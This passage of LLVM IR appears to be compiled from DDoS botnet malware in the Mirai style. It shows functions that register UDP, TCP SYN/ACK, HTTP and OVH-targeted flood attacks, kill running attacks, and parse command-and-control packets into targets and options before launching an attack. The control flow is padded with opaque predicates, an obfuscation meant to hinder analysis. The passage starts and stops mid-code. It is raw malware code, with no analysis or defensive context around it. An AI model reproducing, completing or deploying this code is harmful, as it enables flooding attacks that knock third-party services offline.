([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.255, i32 0, i32 0)], align 16
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@table = common global [126 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 -559038737, align 4
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  call void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_vse)
  call void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_plain)
  call void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_syn)
  call void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_ack)
  call void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_app_http)
  call void @add_attack(i8 zeroext 11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_stdhex)
  call void @add_attack(i8 zeroext 12, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_ovhhex)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = add nsw i32 %17, 1
  %19 = sext i32 %18 to i64
  %20 = mul i64 %19, 8
  %21 = call i8* @realloc(i8* %15, i64 %20) #6
  %22 = bitcast i8* %21 to %struct.attack_method**
  store %struct.attack_method** %22, %struct.attack_method*** @methods, align 8
  %23 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %24 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %25 = load i8, i8* @methods_len, align 1
  %26 = add i8 %25, 1
  store i8 %26, i8* @methods_len, align 1
  %27 = zext i8 %25 to i64
  %28 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %24, i64 %27
  store %struct.attack_method* %23, %struct.attack_method** %28, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  br label %2

; <label>:2:                                      ; preds = %53, %0
  %3 = load i32, i32* @x.5
  %4 = load i32, i32* @y.6
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = load i32, i32* %1, align 4
  %12 = icmp slt i32 %11, 3
  %13 = load i32, i32* @x.5
  %14 = load i32, i32* @y.6
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %12, label %21, label %56

; <label>:21:                                     ; preds = %originalBBpart2
  %22 = load i32, i32* %1, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds [3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 %23
  %25 = load i32, i32* %24, align 4
  %26 = icmp ne i32 %25, 0
  br i1 %26, label %27, label %49

; <label>:27:                                     ; preds = %21
  %28 = load i32, i32* @x.5
  %29 = load i32, i32* @y.6
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %27
  %36 = load i32, i32* %1, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 %37
  %39 = load i32, i32* %38, align 4
  %40 = call i32 @kill(i32 %39, i32 9) #6
  %41 = load i32, i32* @x.5
  %42 = load i32, i32* @y.6
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %49

; <label>:49:                                     ; preds = %originalBBpart24, %21
  %50 = load i32, i32* %1, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 %51
  store i32 0, i32* %52, align 4
  br label %53

; <label>:53:                                     ; preds = %49
  %54 = load i32, i32* %1, align 4
  %55 = add nsw i32 %54, 1
  store i32 %55, i32* %1, align 4
  br label %2

; <label>:56:                                     ; preds = %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %57 = load i32, i32* %1, align 4
  %58 = icmp slt i32 %57, 3
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %27
  %59 = load i32, i32* %1, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds [3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 %60
  %62 = load i32, i32* %61, align 4
  %63 = call i32 @kill(i32 %62, i32 9) #6
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 4
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %2
  br label %283

; <label>:17:                                     ; preds = %2
  %18 = load i8*, i8** %3, align 8
  %19 = bitcast i8* %18 to i32*
  %20 = load i32, i32* %19, align 4
  %21 = call i32 @ntohl(i32 %20) #7
  store i32 %21, i32* %6, align 4
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 4
  store i8* %23, i8** %3, align 8
  %24 = load i32, i32* %4, align 4
  %25 = sext i32 %24 to i64
  %26 = sub i64 %25, 4
  %27 = trunc i64 %26 to i32
  store i32 %27, i32* %4, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %47

; <label>:30:                                     ; preds = %17
  %31 = load i32, i32* @x.7
  %32 = load i32, i32* @y.8
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %30
  %39 = load i32, i32* @x.7
  %40 = load i32, i32* @y.8
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %283

; <label>:47:                                     ; preds = %17
  %48 = load i8*, i8** %3, align 8
  %49 = getelementptr inbounds i8, i8* %48, i32 1
  store i8* %49, i8** %3, align 8
  %50 = load i8, i8* %48, align 1
  store i8 %50, i8* %7, align 1
  %51 = load i32, i32* %4, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 %52, 1
  %54 = trunc i64 %53 to i32
  store i32 %54, i32* %4, align 4
  %55 = load i32, i32* %4, align 4
  %56 = icmp eq i32 %55, 0
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %47
  br label %283

; <label>:58:                                     ; preds = %47
  %59 = load i8*, i8** %3, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %3, align 8
  %61 = load i8, i8* %59, align 1
  store i8 %61, i8* %8, align 1
  %62 = load i32, i32* %4, align 4
  %63 = sext i32 %62 to i64
  %64 = sub i64 %63, 1
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %4, align 4
  %66 = load i8, i8* %8, align 1
  %67 = zext i8 %66 to i32
  %68 = icmp eq i32 %67, 0
  br i1 %68, label %69, label %70

; <label>:69:                                     ; preds = %58
  br label %283

; <label>:70:                                     ; preds = %58
  %71 = load i32, i32* @x.7
  %72 = load i32, i32* @y.8
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %70
  %79 = load i32, i32* %4, align 4
  %80 = sext i32 %79 to i64
  %81 = load i8, i8* %8, align 1
  %82 = zext i8 %81 to i64
  %83 = mul i64 5, %82
  %84 = icmp ult i64 %80, %83
  %85 = load i32, i32* @x.7
  %86 = load i32, i32* @y.8
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %84, label %93, label %94

; <label>:93:                                     ; preds = %originalBBpart24
  br label %283

; <label>:94:                                     ; preds = %originalBBpart24
  %95 = load i8, i8* %8, align 1
  %96 = zext i8 %95 to i64
  %97 = call noalias i8* @calloc(i64 %96, i64 24) #6
  %98 = bitcast i8* %97 to %struct.attack_target*
  store %struct.attack_target* %98, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  br label %99

; <label>:99:                                     ; preds = %146, %94
  %100 = load i32, i32* %5, align 4
  %101 = load i8, i8* %8, align 1
  %102 = zext i8 %101 to i32
  %103 = icmp slt i32 %100, %102
  br i1 %103, label %104, label %149

; <label>:104:                                    ; preds = %99
  %105 = load i8*, i8** %3, align 8
  %106 = bitcast i8* %105 to i32*
  %107 = load i32, i32* %106, align 4
  %108 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %109 = load i32, i32* %5, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %108, i64 %110
  %112 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %111, i32 0, i32 1
  store i32 %107, i32* %112, align 4
  %113 = load i8*, i8** %3, align 8
  %114 = getelementptr inbounds i8, i8* %113, i64 4
  store i8* %114, i8** %3, align 8
  %115 = load i8*, i8** %3, align 8
  %116 = getelementptr inbounds i8, i8* %115, i32 1
  store i8* %116, i8** %3, align 8
  %117 = load i8, i8* %115, align 1
  %118 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %119 = load i32, i32* %5, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %118, i64 %120
  %122 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %121, i32 0, i32 2
  store i8 %117, i8* %122, align 4
  %123 = load i32, i32* %4, align 4
  %124 = sext i32 %123 to i64
  %125 = sub i64 %124, 5
  %126 = trunc i64 %125 to i32
  store i32 %126, i32* %4, align 4
  %127 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %128 = load i32, i32* %5, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %127, i64 %129
  %131 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %130, i32 0, i32 0
  %132 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %131, i32 0, i32 0
  store i16 2, i16* %132, align 4
  %133 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %134 = load i32, i32* %5, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %133, i64 %135
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %136, i32 0, i32 1
  %138 = load i32, i32* %137, align 4
  %139 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %140 = load i32, i32* %5, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %139, i64 %141
  %143 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %142, i32 0, i32 0
  %144 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %143, i32 0, i32 2
  %145 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %144, i32 0, i32 0
  store i32 %138, i32* %145, align 4
  br label %146

; <label>:146:                                    ; preds = %104
  %147 = load i32, i32* %5, align 4
  %148 = add nsw i32 %147, 1
  store i32 %148, i32* %5, align 4
  br label %99

; <label>:149:                                    ; preds = %99
  %150 = load i32, i32* @x.7
  %151 = load i32, i32* @y.8
  %152 = sub i32 %150, 1
  %153 = mul i32 %150, %152
  %154 = urem i32 %153, 2
  %155 = icmp eq i32 %154, 0
  %156 = icmp slt i32 %151, 10
  %157 = or i1 %155, %156
  br i1 %157, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %149
  %158 = load i32, i32* %4, align 4
  %159 = sext i32 %158 to i64
  %160 = icmp ult i64 %159, 1
  %161 = load i32, i32* @x.7
  %162 = load i32, i32* @y.8
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %160, label %169, label %170

; <label>:169:                                    ; preds = %originalBBpart28
  br label %283

; <label>:170:                                    ; preds = %originalBBpart28
  %171 = load i8*, i8** %3, align 8
  %172 = getelementptr inbounds i8, i8* %171, i32 1
  store i8* %172, i8** %3, align 8
  %173 = load i8, i8* %171, align 1
  store i8 %173, i8* %9, align 1
  %174 = load i32, i32* %4, align 4
  %175 = sext i32 %174 to i64
  %176 = sub i64 %175, 1
  %177 = trunc i64 %176 to i32
  store i32 %177, i32* %4, align 4
  %178 = load i8, i8* %9, align 1
  %179 = zext i8 %178 to i32
  %180 = icmp sgt i32 %179, 0
  br i1 %180, label %181, label %275

; <label>:181:                                    ; preds = %170
  %182 = load i8, i8* %9, align 1
  %183 = zext i8 %182 to i64
  %184 = call noalias i8* @calloc(i64 %183, i64 16) #6
  %185 = bitcast i8* %184 to %struct.attack_option*
  store %struct.attack_option* %185, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  br label %186

; <label>:186:                                    ; preds = %271, %181
  %187 = load i32, i32* %5, align 4
  %188 = load i8, i8* %9, align 1
  %189 = zext i8 %188 to i32
  %190 = icmp slt i32 %187, %189
  br i1 %190, label %191, label %274

; <label>:191:                                    ; preds = %186
  %192 = load i32, i32* %4, align 4
  %193 = sext i32 %192 to i64
  %194 = icmp ult i64 %193, 1
  br i1 %194, label %195, label %196

; <label>:195:                                    ; preds = %191
  br label %283

; <label>:196:                                    ; preds = %191
  %197 = load i8*, i8** %3, align 8
  %198 = getelementptr inbounds i8, i8* %197, i32 1
  store i8* %198, i8** %3, align 8
  %199 = load i8, i8* %197, align 1
  %200 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %201 = load i32, i32* %5, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %200, i64 %202
  %204 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %203, i32 0, i32 1
  store i8 %199, i8* %204, align 8
  %205 = load i32, i32* %4, align 4
  %206 = sext i32 %205 to i64
  %207 = sub i64 %206, 1
  %208 = trunc i64 %207 to i32
  store i32 %208, i32* %4, align 4
  %209 = load i32, i32* %4, align 4
  %210 = sext i32 %209 to i64
  %211 = icmp ult i64 %210, 1
  br i1 %211, label %212, label %213

; <label>:212:                                    ; preds = %196
  br label %283

; <label>:213:                                    ; preds = %196
  %214 = load i32, i32* @x.7
  %215 = load i32, i32* @y.8
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %213
  %222 = load i8*, i8** %3, align 8
  %223 = getelementptr inbounds i8, i8* %222, i32 1
  store i8* %223, i8** %3, align 8
  %224 = load i8, i8* %222, align 1
  store i8 %224, i8* %12, align 1
  %225 = load i32, i32* %4, align 4
  %226 = sext i32 %225 to i64
  %227 = sub i64 %226, 1
  %228 = trunc i64 %227 to i32
  store i32 %228, i32* %4, align 4
  %229 = load i32, i32* %4, align 4
  %230 = load i8, i8* %12, align 1
  %231 = zext i8 %230 to i32
  %232 = icmp slt i32 %229, %231
  %233 = load i32, i32* @x.7
  %234 = load i32, i32* @y.8
  %235 = sub i32 %233, 1
  %236 = mul i32 %233, %235
  %237 = urem i32 %236, 2
  %238 = icmp eq i32 %237, 0
  %239 = icmp slt i32 %234, 10
  %240 = or i1 %238, %239
  br i1 %240, label %originalBBpart222, label %originalBB10alteredBB

originalBBpart222:                                ; preds = %originalBB10
  br i1 %232, label %241, label %242

; <label>:241:                                    ; preds = %originalBBpart222
  br label %283

; <label>:242:                                    ; preds = %originalBBpart222
  %243 = load i8, i8* %12, align 1
  %244 = zext i8 %243 to i32
  %245 = add nsw i32 %244, 1
  %246 = sext i32 %245 to i64
  %247 = call noalias i8* @calloc(i64 %246, i64 1) #6
  %248 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %249 = load i32, i32* %5, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %248, i64 %250
  %252 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %251, i32 0, i32 0
  store i8* %247, i8** %252, align 8
  %253 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %254 = load i32, i32* %5, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %253, i64 %255
  %257 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %256, i32 0, i32 0
  %258 = load i8*, i8** %257, align 8
  %259 = load i8*, i8** %3, align 8
  %260 = load i8, i8* %12, align 1
  %261 = zext i8 %260 to i32
  call void @util_memcpy(i8* %258, i8* %259, i32 %261)
  %262 = load i8, i8* %12, align 1
  %263 = zext i8 %262 to i32
  %264 = load i8*, i8** %3, align 8
  %265 = sext i32 %263 to i64
  %266 = getelementptr inbounds i8, i8* %264, i64 %265
  store i8* %266, i8** %3, align 8
  %267 = load i8, i8* %12, align 1
  %268 = zext i8 %267 to i32
  %269 = load i32, i32* %4, align 4
  %270 = sub nsw i32 %269, %268
  store i32 %270, i32* %4, align 4
  br label %271

; <label>:271:                                    ; preds = %242
  %272 = load i32, i32* %5, align 4
  %273 = add nsw i32 %272, 1
  store i32 %273, i32* %5, align 4
  br label %186

; <label>:274:                                    ; preds = %186
  br label %275

; <label>:275:                                    ; preds = %274, %170
  %276 = call i32* @__errno_location() #7
  store i32 0, i32* %276, align 4
  %277 = load i32, i32* %6, align 4
  %278 = load i8, i8* %7, align 1
  %279 = load i8, i8* %8, align 1
  %280 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %281 = load i8, i8* %9, align 1
  %282 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %277, i8 zeroext %278, i8 zeroext %279, %struct.attack_target* %280, i8 zeroext %281, %struct.attack_option* %282)
  br label %283

; <label>:283:                                    ; preds = %275, %241, %212, %195, %169, %93, %69, %57, %originalBBpart2, %16
  %284 = load i32, i32* @x.7
  %285 = load i32, i32* @y.8
  %286 = sub i32 %284, 1
